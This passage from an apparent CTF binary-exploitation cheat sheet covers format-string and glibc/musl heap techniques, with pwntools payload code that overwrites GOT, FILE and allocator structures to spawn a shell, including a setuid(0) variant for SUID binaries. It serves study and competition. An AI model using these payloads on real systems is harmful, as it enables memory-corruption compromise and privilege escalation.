|----------|-----------------|
| 6 | Pointer to dealer/opponent state |
| 7 | Pointer to player state |
| 8-10 | Score, health, inventory |

**When `%n` writes to adjacent variables:** If player and dealer chips are adjacent in memory (4 bytes apart), positions N and N+1 point to them. Write 0 to dealer (`%N$n` with 0 chars printed) and high value to player (`%9999c%(N+1)$n`).

**Key insight:** Format string vulnerabilities in game binaries are simpler than typical pwn — you don't need shell, just manipulate game state to trigger the win condition. Map stack positions to game variables, then write the winning values.

---

## Format String Saved EBP Overwrite for .bss Pivot (PlaidCTF 2015)

**Pattern (EBP):** Format string buffer is in `.bss` (fixed address) rather than on the stack. Classic `%n` arbitrary-write requires attacker addresses on the stack, which is impossible with `.bss` buffers. Instead, overwrite the saved EBP to redirect the function epilogue (`leave; ret`) to the `.bss` buffer.

**How `leave; ret` works:**
```asm
leave:  mov esp, ebp    ; esp = saved_ebp
        pop ebp         ; ebp = [saved_ebp]
ret:    pop eip         ; eip = [saved_ebp + 4]
```

**Exploit layout in `.bss` buffer at address `0x0804A080`:**
```text
[addr_of_buf-4][padding_to_write_value][%n][shellcode...]
```
Write `buf_addr - 4` (e.g., `0x0804A07C`) into saved EBP via `%n`. On function return, `leave` sets `esp = 0x0804A07C`, then `ret` jumps to the value at `0x0804A080` — the start of shellcode.

**Key insight:** When the format string buffer is at a fixed `.bss` address (not stack), overwrite saved EBP to pivot the stack into `.bss`. The `leave; ret` epilogue uses EBP to set ESP, so controlling EBP controls where `ret` reads EIP from. Place shellcode address (or ROP chain) at `buf_addr` and shellcode at `buf_addr + offset`.

---

## argv[0] Overwrite for Stack Smash Info Leak (HITCON CTF 2015)

**Pattern (nanana):** When a stack canary is corrupted, glibc's `__stack_chk_fail` prints: `*** stack smashing detected ***: <argv[0]> terminated`. Since `argv[0]` is a pointer stored on the stack, overwriting it with the address of a secret (e.g., global password buffer) leaks the secret through the crash message.

**Attack steps:**
1. Overflow past the canary (deliberately corrupting it)
2. Continue overwriting the stack to reach `argv[0]` (pointer to program name)
3. Replace `argv[0]` with the address of the target data (e.g., `0x601090` = `g_password`)
4. The stack smash handler prints: `*** stack smashing detected ***: <password_contents>`

```python
# Overflow to overwrite argv[0] with address of global password
payload = b"A" * canary_offset     # reach canary (deliberately corrupt it)
payload += b"B" * (argv0_offset - canary_offset)  # padding to argv[0]
payload += p64(password_addr)      # overwrite argv[0] -> password string
```

**Key insight:** A "failed" exploit that triggers `__stack_chk_fail` becomes an information leak when `argv[0]` is overwritten. This is useful as a first stage: leak a secret (password, canary, address), then use it in a second connection for the real exploit. Works because `argv` is stored on the stack above local variables.

---

## Format String .fini_array Loop for Multi-Stage Exploitation (Codegate 2016)

**Pattern:** When no GOT function is called after `printf()`, chain multiple format string writes across re-executions by overwriting `.fini_array` with `main()`:

1. **Stage 1:** Overwrite `.fini_array[0]` with `main()`, leak libc + stack pointers
2. **Stage 2:** Overwrite `printf@GOT` with `system()`, overwrite `__stack_chk_fail@GOT` with `main()`
3. **Stage 3:** Deliberately corrupt stack canary so `__stack_chk_fail` re-enters `main()`. Now `printf(input)` is `system(input)` -- send `/bin/sh`

```python
# Stage 1: loop back via .fini_array, leak addresses
payload = fmtstr_payload(offset, {fini_array: main_addr})
# Stage 2: redirect printf to system, set up canary fail re-entry
payload = fmtstr_payload(offset, {printf_got: system, stack_chk_got: main_addr})
# Stage 3: corrupt canary -> __stack_chk_fail -> main -> system(input)
```

**Key insight:** `.fini_array` entries are called when `main()` returns. Overwriting with `main()` creates an execution loop for multi-stage format string attacks. Deliberately corrupting the canary triggers `__stack_chk_fail` as a controlled re-entry vector when that GOT entry has been redirected.

**References:** Codegate 2016

---

## __printf_chk Bypass with Sequential %p (VolgaCTF 2017)

**Pattern:** `__printf_chk()` blocks `%n` writes and direct parameter access (`%123$p`). Bypass by chaining sequential `%p` specifiers to reach the desired stack offset.

```python
from pwn import *

# __printf_chk restrictions:
# - No %n/%hn/%hhn writes
# - No direct access: %123$p fails
# - Sequential access still works: %p%p%p...

# Leak canary at stack offset 267:
payload = "%p." * 267 + "%p"  # sequential %p to offset 267
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
canary = int(leaks[266], 16)  # 267th value (0-indexed)

# Leak libc return address at offset 269:
payload = "%p." * 269 + "%p"
io.sendline(payload.encode())
response = io.recvline().decode()
leaks = response.split(".")
libc_ret = int(leaks[268], 16)
libc_base = libc_ret - known_offset

# Then use stack overflow for ROP since format string write is blocked
payload = b"A" * buf_size
payload += p64(canary)
payload += p64(0)           # saved rbp
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
```

**Key insight:** While `__printf_chk` prevents `%n` and direct parameter access (`%N$`), it still allows sequential format specifiers. Chaining hundreds of `%p` reaches any stack offset, enabling leaks (canary, libc, PIE) even without write capability. Combine with a separate overflow vulnerability for the write stage.

**When to recognize:** Binary uses `__printf_chk` or `__fprintf_chk` (visible in disassembly or via `__fortify_source`). Direct `%N$p` fails but sequential `%p%p%p...` still works. Output may be very large -- parse carefully with delimiters.

**References:** VolgaCTF 2017

---

## Leak + GOT Overwrite in Single printf Call (picoCTF 2017)

**Pattern:** When a format string vulnerability is followed immediately by `exit(0)`, combine address leak and GOT overwrite in a single printf invocation.

```python
from pwn import *

# Must leak libc AND redirect exit() in one printf call
# Layout: padding + dummy_addr + %leak$p + %Nc + %write$hn + padding + got_addr

exit_got = elf.got['exit']
main_addr = elf.sym['main']
target_low16 = main_addr & 0xFFFF

payload = b'e_______'                     # 8 bytes padding
payload += p64(0x4141414141)              # dummy (consumed by leak specifier)
payload += b' %25$p'                      # leak libc address at offset 25
# Calculate bytes needed: target_low16 - bytes_written_so_far
bytes_written = len(payload)
padding_needed = (target_low16 - bytes_written) % 0x10000
payload += f'%{padding_needed}c%19$hn'.encode()  # write low 2 bytes to offset 19
payload += b'A' * ((8 - (len(payload) % 8)) % 8) # alignment to 8 bytes
payload += p64(exit_got)                  # address for %19$hn write

# Result: leaks libc via %25$p AND overwrites exit@GOT via %19$hn
# exit() jumps back to main for second-stage exploitation
io.sendline(payload)

# Parse leaked libc address from output
io.recvuntil(b' 0x')
libc_leak = int(io.recv(12), 16)
libc_base = libc_leak - known_offset

# Second pass: now with libc known, overwrite for shell
# ...
```

**Key insight:** A single `printf` can perform both reads (`%p`) and writes (`%hn`) simultaneously. When `exit()` immediately follows the vulnerability, overwrite `exit@GOT` with `main`'s address in the same call that leaks libc, creating a re-entry point for full exploitation. The key is careful offset calculation so the leak specifier and write specifier reference the correct stack positions.

**When to recognize:** Format string vulnerability with only one shot before `exit()` or another terminating function. The single-call technique avoids needing a loop or re-entry mechanism before establishing one.

**References:** picoCTF 2017

---

## Objective-C %@ Format Specifier Exploitation (SHA2017)

**Pattern:** Objective-C's `NSLog` and related functions support the `%@` format specifier, which calls `objc_msg_lookup(rdi, ...)` treating the corresponding stack value as an Objective-C object pointer. Control the stack value pointed to by `%N$@` to control `rdi`. Analysis of `objc_msg_lookup` reveals a `call rax` gadget reachable with crafted conditions, enabling one-shot execution.

**Mechanism:**
```text
NSLog(@"Hello %@", user_input)
    → %@ consumes next argument from stack
    → argument is treated as Objective-C object pointer (rdi)
    → objc_msg_lookup(rdi, "description") is called
    → if [rdi+8] == 0 (ISA check fails), execution reaches: call rax
    → rax is under attacker control via the crafted "object"
```

**Exploitation:**
```python
# Craft a fake Objective-C object on the stack via format string write
# Object layout: [isa_ptr][method_list_ptr][...]
# Set isa_ptr = 0 to reach the call rax path in objc_msg_lookup
# Set rax = one_gadget or system() via prior %n writes

# Locate %N$@ position: stack offset where fake object pointer lands
# Use %n to write fake object address at the right stack slot
# Then trigger %@ to call objc_msg_lookup → call rax → shell
payload = b'%<distance>c%<write_offset>$lln'  # write fake obj addr
payload += b'%<obj_offset>$@'                  # trigger call rax
```

**Key insight:** Objective-C format strings include `%@` which invokes `objc_msg_lookup` on a stack pointer — turns a read-only FSB into a controlled-call primitive via the objc runtime. The `call rax` gadget inside `objc_msg_lookup` is reachable when the ISA pointer check fails, making a crafted "null ISA" object sufficient to redirect execution.

**References:** SHA2017

---

## strlen Integer Truncation Bypass (ASIS CTF Finals 2017)

**Pattern:** Binary filters format string input by checking that each character up to `strlen(input)+1` is lowercase. However, the `strlen()` result is cast to `int8_t`: at input length 255, `(int8_t)(255 + 1)` overflows to 0, collapsing the sanitization window to an empty range. Format specifiers like `%n` placed beyond byte 255 bypass the filter entirely.

**Vulnerable code pattern:**
```c
void filter(char *input) {
    int8_t len = (int8_t)strlen(input);  // truncates at 255 → wraps to -1 or 0
    for (int8_t i = 0; i <= len; i++) {  // at len==-1 (255 cast): 0 <= -1 is false
        if (!islower(input[i]))
            reject();
    }
}
```

**Exploitation:**
```python
# Pad with 255 lowercase bytes, then place %n-based payload starting at byte 255
# The filter checks bytes 0..len, but len wraps to -1 (or 0+1=0), so no bytes checked
filler = b'a' * 255
exploit_suffix = b'%7$n' + p64(target_addr)  # unchecked bytes
payload = filler + exploit_suffix
```

**Key insight:** `strlen()` cast to `int8_t` produces signed overflow at length 255, collapsing the sanitization window to zero. Any payload content placed at or beyond byte 255 escapes the filter. Always check for integer truncation when a length field is stored in a signed or short type.

**References:** ASIS CTF Finals 2017


# heap-techniques

# CTF Pwn - Heap Techniques

## Table of Contents
- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
  - [setcontext Variant for SUID Binaries (Midnight Flag 2026)](#setcontext-variant-for-suid-binaries-midnight-flag-2026)
- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
- [Heap Exploitation](#heap-exploitation)
  - [Heap Grooming via Application Operations (Codegate 2013)](#heap-grooming-via-application-operations-codegate-2013)
- [Custom Allocator Exploitation](#custom-allocator-exploitation)
  - [talloc Pool Header Forgery for Arbitrary Read/Write (Boston Key Party 2016)](#talloc-pool-header-forgery-for-arbitrary-readwrite-boston-key-party-2016)
- [Classic Heap Unlink Attack (Crypto-Cat)](#classic-heap-unlink-attack-crypto-cat)
- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)
- [House of Orange](#house-of-orange)
- [House of Spirit](#house-of-spirit)
- [House of Lore](#house-of-lore)
- [House of Force (CSAW CTF 2016)](#house-of-force-csaw-ctf-2016)
- [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
- [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)
- [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
- [Fastbin stdout Vtable Two-Stage Hijack for PIE + Full RELRO (ASIS CTF 2017)](#fastbin-stdout-vtable-two-stage-hijack-for-pie--full-relro-asis-ctf-2017)
- [_IO_buf_base Null Byte Overwrite for stdin Hijack (Tokyo Westerns 2017)](#_io_buf_base-null-byte-overwrite-for-stdin-hijack-tokyo-westerns-2017)
- [glibc 2.24+ _IO_FILE Vtable Validation Bypass (HITCON 2017)](#glibc-224-_io_file-vtable-validation-bypass-hitcon-2017)
- [Unsorted Bin Attack on stdin _IO_buf_end (HITCON 2017)](#unsorted-bin-attack-on-stdin-_io_buf_end-hitcon-2017)
- [Unsorted Bin Corruption via mp_ Structure (HITCON 2017)](#unsorted-bin-corruption-via-mp_-structure-hitcon-2017)

---

## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)

**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

**Fake FILE structure requirements:**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.

**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

### setcontext Variant for SUID Binaries (Midnight Flag 2026)

When exploiting SUID-root binaries, `system("/bin/sh")` fails because dash drops privileges when `uid != euid`. Replace the `system(fp)` target with `setcontext(fp)` to pivot to a ROP chain that calls `setuid(0)` first:

```python
# Wide vtable targets setcontext instead of system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.setcontext + 61),  # __doallocate → setcontext
})

# setcontext loads registers from offsets relative to RDX (which points to fp->_wide_data):
#   RSP from [rdx+0xa0], RIP from [rdx+0xa8], RDI from [rdx+0x68]
# Place ROP chain at _wide_data structure:
fake_wide_data = flat({
    0x18: p64(0),                     # _IO_write_base = 0
    0x30: p64(0),                     # _IO_buf_base = 0
    0x68: p64(0),                     # RDI = 0 (for setuid(0))
    0xa0: p64(rop_chain_addr),        # RSP = pivot to ROP chain
    0xa8: p64(libc.sym.setuid),       # RIP = setuid as first call
    0xe0: p64(fake_wide_vtable_addr), # _wide_vtable
})

# ROP chain at rop_chain_addr:
rop = flat([
    pop_rdi_ret,
    libc.address + 0,               # After setuid(0) returns here
    # ... additional setup ...
    libc.sym.system,
    next(libc.search(b"/bin/sh\x00")),
])
```

**Trigger chain:** `exit()` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `setcontext(fp)` → stack pivot → `setuid(0)` → `system("/bin/sh")`.

**Key insight:** `setcontext` is a universal stack pivot gadget — it loads RSP, RDI, and RIP from controlled memory, enabling arbitrary ROP execution from a FILE-based exploit. Essential for SUID binaries where dash enforces `uid == euid`.

---

## House of Einherjar — Off-by-One Null Byte (0xFun 2026)

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit chain:**
1. Set `prev_size` of next chunk to create fake backward consolidation
2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
3. After consolidation, overlapping chunks enable tcache poisoning
4. Overwrite `stdout` or `_IO_list_all` for FSOP

**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**Setup sequence:**
1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
2. Write fake chunk into A with self-referencing pointers
3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
4. Free B → consolidates backward into A → overlapping chunk
5. Allocate over the overlap region to control other live chunks

---

## Heap Exploitation

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

### Heap Grooming via Application Operations (Codegate 2013)

**Pattern:** Multi-step application-level operations (create/reply/delete in a board, forum, or note app) to achieve controlled heap state for exploitation.

**Technique:**
1. Create N entries with overflow payloads in author/title/content fields
2. Fill reply buffers for each entry (e.g., 127 replies of `"sh"`) to place controlled data at predictable heap locations
3. Selectively delete entries to create specific heap holes
4. Allocate new entries that land in freed chunks, overlapping with surviving metadata

```python
# Example: Codegate 2013 Vuln 400 — board-based heap grooming
# Step 1: Create 7 posts with overflow in content field
for i in range(7):
    create_post("YOLO", "YOLO",
        "A" * 36 + pack("I", got_addr) +    # Author overflow
        "A" * 604 + pack("I", got_addr) +    # Content overflow
        pack("I", plt_addr) * 80)            # Spray GOT targets

# Step 2: Fill reply buffers to heap-spray "sh" strings
for i in range(7):
    for j in range(127):
        reply_to_post(i, "sh")

# Step 3: Delete 5 of 7 to create specific heap holes
for i in [0, 1, 2, 3, 4]:
    delete_post(i)

# Step 4: Allocate 2 new entries into freed space
create_post(payload_a, payload_b, payload_c)
create_post(payload_d, payload_e, payload_f)

# Step 5: Trigger via modify + delete sequence
modify_post(target_id, trigger_payload)
delete_post(target_id)  # Triggers GOT overwrite → shell
```

**Key insight:** Application operations (create, reply, delete, modify) map to heap allocations and frees of predictable sizes. By controlling the sequence and count of operations, you achieve the same effect as direct heap manipulation but through the application's own interface.

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

### talloc Pool Header Forgery for Arbitrary Read/Write (Boston Key Party 2016)

**Pattern:** talloc is a hierarchical memory allocator (used in Samba, CUPS, etc.). Forge fake pool headers with controlled fields to redirect allocations to arbitrary addresses.

```c
// talloc pool header fields: end, object_count, hdr_fill
// followed by talloc_chunk: next, prev, parent, child, refs, name, size, flags, pool
// Set pool boundaries to span target address
// Next allocation returns attacker-controlled address
// Read GOT for libc leak, write __free_hook with system()
```

**Exploitation steps:**
1. Leak heap address through application data
2. Forge talloc pool header with `end` pointing past target address
3. Next `talloc()` call returns memory at attacker-chosen location
4. Use arbitrary read (GOT) for libc leak, arbitrary write for hook overwrite

**Key insight:** Custom allocator pool metadata controls where future allocations land. When applications use talloc, pool header forgery provides arbitrary memory placement. The hierarchical parent/child structure means corrupting one header cascades through the allocation tree.

**References:** Boston Key Party 2016

## Classic Heap Unlink Attack (Crypto-Cat)

**When to use:** Old glibc (< 2.26, no tcache) or educational heap challenges. Overflow one heap chunk's metadata to corrupt the next chunk's `prev_size` and `size` fields, then trigger an unlink during `free()` that writes an arbitrary value to an arbitrary address.

**How dlmalloc unlink works:**
```c
// When free() consolidates with an adjacent free chunk:
// FD = P->fd, BK = P->bk
// FD->bk = BK    (write BK to FD + offset)
// BK->fd = FD    (write FD to BK + offset)
// This is a write-what-where primitive
```

**Exploit pattern:**
1. Allocate two adjacent chunks (A and B)
2. Overflow A's data into B's chunk header:
   - Set B's `prev_size` to A's data size (fake "previous chunk is free")
   - Clear B's `PREV_INUSE` bit in `size` field
   - Craft fake `fd` and `bk` pointers in A's data area
3. Free B → `free()` thinks A is also free, triggers backward consolidation → unlink on fake chunk

```python
from pwn import *

# Fake chunk in A's data region
fake_fd = target_addr - 0x18  # GOT entry - 3*sizeof(ptr)
fake_bk = target_addr - 0x10  # GOT entry - 2*sizeof(ptr)

# Overflow from A into B's header
payload = p64(0)              # fake prev_size for A
payload += p64(data_size)     # fake size for A (marks A as "free")
payload += p64(fake_fd)       # fd pointer
payload += p64(fake_bk)       # bk pointer
payload += b'A' * (data_size - 32)  # fill A's data
payload += p64(data_size)     # overwrite B's prev_size
payload += p64(b_size & ~1)   # overwrite B's size, clear PREV_INUSE bit

# After free(B): target_addr now contains a pointer we control
```

**Modern mitigations:** glibc 2.26+ added safe-unlinking checks (`FD->bk == P && BK->fd == P`). For modern heaps, use tcache poisoning, House of Apple 2, or House of Einherjar instead.

**Key insight:** The unlink macro performs two pointer writes. By controlling `fd` and `bk` in a fake chunk, you get a constrained write-what-where: each location gets the other's value. Classic use: overwrite a GOT entry with the address of a win function or shellcode.

---

## musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)

**Pattern (atypical-heap):** Binary linked against musl libc (not glibc). musl's allocator uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation to controlled address.

**musl allocator layout:**
- Each allocation belongs to a `group`, managed by a `meta` struct
- `meta->mem` points to the group's data region
- First `0x70`-class allocation places `meta0->mem` at a fixed offset from PIE base (e.g., `chall_base + 0x3f20`)

**Exploitation chain:**
1. **Leak meta pointer** — OOB read at offset `0x80` from a heap allocation reads the `meta` struct pointer
2. **Recover PIE base** — `meta0->mem` is at a fixed offset from the binary base
3. **Redirect allocation** — Overwrite `meta->mem` to point at a live group or target address. Next allocation from that group returns attacker-controlled memory
4. **atexit hijack** — Overwrite musl's `atexit` handler list with `system("cat flag")`. Normal program exit triggers code execution

```python
# Leak meta pointer via OOB read
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# Next alloc returns target_addr — use to overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**Key insight:** musl's allocator metadata (`meta` structs) is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).

**Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.

---

## House of Orange

**Pattern:** Trigger unsorted bin allocation without calling `free()`. Overwrite the top chunk size to a small value via heap overflow. Next large allocation fails the top chunk, forces `sysmalloc` to free the old top chunk into unsorted bin. Then corrupt the freed chunk for FSOP or tcache attack.

```python
# Step 1: Overflow to corrupt top chunk size
# Top chunk must have PREV_INUSE set and size aligned to page
# Size must be < MINSIZE away from page boundary
edit(0, b'A' * overflow_len + p64(0xc01))  # Fake small top chunk

# Step 2: Request larger than corrupted top size
# Forces sysmalloc → old top freed into unsorted bin
add(0x1000, b'B')  # Triggers the free

# Step 3: Unsorted bin attack or FSOP from here
# Overwrite _IO_list_all via unsorted bin's bk pointer
```

**Key insight:** House of Orange creates a free chunk without ever calling `free()` — essential when the binary has no delete/free functionality. The corrupted top chunk size must satisfy: `(size & 0xFFF) == 0` (page-aligned end), `size >= MINSIZE`, and `PREV_INUSE` bit set.

**Requirements:** Heap overflow that can reach top chunk metadata. glibc < 2.26 for classic variant; modern versions need FSOP chain (House of Apple 2).

---

## House of Spirit

**Pattern:** Forge a fake chunk in attacker-controlled memory (stack, .bss, or heap), then `free()` it to get it into a bin. Next allocation of that size returns the fake chunk, giving write access to the target area.

```python
# Forge fake fastbin chunk on the stack
# Need valid size field and next chunk's size for validation
fake_chunk = flat(
    0,              # prev_size
    0x41,           # size (0x40 + PREV_INUSE) — must match target fastbin
    0, 0, 0, 0, 0, 0,  # data area (8 qwords for 0x40 chunk)
    0,              # next chunk prev_size
    0x41,           # next chunk size (passes free() validation)
)

# Write fake chunk address somewhere the binary will free()
# e.g., overwrite a pointer that gets passed to free()
overwrite_ptr(target_ptr, addr_of_fake_chunk + 0x10)

# Trigger free(target_ptr) → fake chunk enters fastbin
trigger_free()

# Next malloc(0x38) returns our fake chunk → write to controlled area
malloc_and_write(0x38, payload)
```

**Key insight:** The key constraint is that `free()` validates the size of the chunk AND the size of the "next" chunk (at `chunk + size`). Both must look valid — sizes in fastbin range (0x20-0x80 on 64-bit), with proper alignment and flags.

---

## House of Lore

**Pattern:** Corrupt a smallbin chunk's `bk` pointer to point to a fake chunk in attacker-controlled memory. When the smallbin is used for allocation, the fake chunk gets linked into the bin. A second allocation returns the fake chunk, giving arbitrary write.

```python
# Step 1: Free a chunk into smallbin (via unsorted bin → sorted)
free(chunk_a)
malloc(large_size)  # Forces sorting: chunk_a moves to smallbin

# Step 2: Forge fake chunk in target area
# fake->fd must point back to the real smallbin chunk
# fake->bk must point to another valid-looking chunk (or same)
fake = flat(
    0, 0x91,                    # prev_size, size
    addr_of_real_chunk,         # fd → points back to legitimate chunk
    addr_of_fake2,              # bk → another fake or self
)

# Step 3: Overwrite chunk_a->bk to point to our fake chunk
edit_freed_chunk(chunk_a, bk=addr_of_fake)

# Step 4: Two allocations from this smallbin
alloc1 = malloc(0x80)  # Returns chunk_a (legitimate)
alloc2 = malloc(0x80)  # Returns our fake chunk → arbitrary write!
```

**Key insight:** Requires corrupting `bk` of a freed smallbin chunk. The fake chunk's `fd` must point back to a chunk whose `bk` points to the fake — glibc checks `victim->bk->fd == victim`. On older glibc this check is weaker.

---

## House of Force (CSAW CTF 2016)

**Pattern:** Overwrite the wilderness (top) chunk's size field with a large value (e.g., `0xffffffffffffffff`), then request a carefully calculated allocation to move the heap pointer to an arbitrary address (e.g., GOT table).

```python
from pwn import *

elf = ELF('./target')
libc = ELF('./libc.so.6')

# Step 1: Overflow into top chunk header, set size to -1 (0xffffffffffffffff)
add_card(-1, b'A' * 24 + p64(0xffffffffffffffff))

# Step 2: Calculate distance from top chunk to target (e.g., GOT entry)
# evil_size = target_address - current_top_chunk_ptr - metadata_size
target = elf.got['strtol']
evil_size = target - 16 - top_chunk_ptr

# Step 3: Allocate evil_size to advance top chunk pointer to target
add_card(evil_size - 25, b'')

# Step 4: Next allocation overlaps the target - write desired value
# Overwrite strtol@GOT with system() address
add_card(100, p64(libc.symbols['system']))

# Step 5: Trigger - next call to strtol(user_input) calls system(user_input)
io.sendline(b'/bin/sh')
```

**Key insight:** House of Force requires: (1) overflow into the top chunk to control its size field, (2) a single malloc of attacker-controlled size to position the heap, (3) a subsequent allocation at the target address. Works on glibc < 2.29 where top chunk size validation was added.

---

## tcache Stashing Unlink Attack

**Pattern:** Exploit tcache's interaction with smallbin during `malloc()`. When tcache for a size is not full, `malloc()` from smallbin will "stash" remaining smallbin chunks into tcache. During stashing, the `bk` pointer is followed without full validation, allowing arbitrary address to be linked into tcache.

```python
# Setup: Need 7 chunks in tcache (to later drain) + 2 in smallbin
# The 2nd smallbin chunk has corrupted bk → target address

# Step 1: Fill tcache with 7 chunks, then free 2 more into smallbin
for i in range(7):
    free(tcache_chunks[i])
# These two go to unsorted → smallbin after sorting
free(smallbin_chunk_1)
free(smallbin_chunk_2)
malloc(large)  # Sort unsorted bin → chunks enter smallbin

# Step 2: Drain tcache
for i in range(7):
    malloc(target_size)

# Step 3: Corrupt smallbin_chunk_2->bk to point to (target_addr - 0x10)
# target_addr - 0x10 because tcache stores user data pointer at chunk+0x10
edit_after_free(smallbin_chunk_2, bk=target_addr - 0x10)

# Step 4: Allocate from smallbin
# malloc returns smallbin_chunk_1
# Stashing mechanism follows bk chain:
#   smallbin_chunk_2 gets stashed into tcache
#   Then follows corrupted bk → target gets stashed into tcache too!
malloc(target_size)

# Step 5: Next two mallocs: first returns smallbin_chunk_2, second returns target
malloc(target_size)  # Returns chunk_2
malloc(target_size)  # Returns target_addr → arbitrary write!
```

**Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a main_arena pointer to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.

**Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.

---

## Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)

**Pattern:** After a classic unsafe unlink writes a self-referential pointer into a BSS note table, craft a second fake chunk in BSS whose size spans from the BSS address to the heap's top chunk: `size = (heap_top_addr - bss_fake_addr) | PREV_INUSE`. Freeing this fake chunk consolidates it with the top chunk, effectively relocating the heap's allocation base into BSS. Subsequent malloc calls return memory overlapping the global pointer table, granting arbitrary read/write.

```python
# Step 1: Unsafe unlink places self-pointer at bss_table[3]
# Fake chunk: fd = &bss_table[3] - 0x18, bk = &bss_table[3] - 0x10
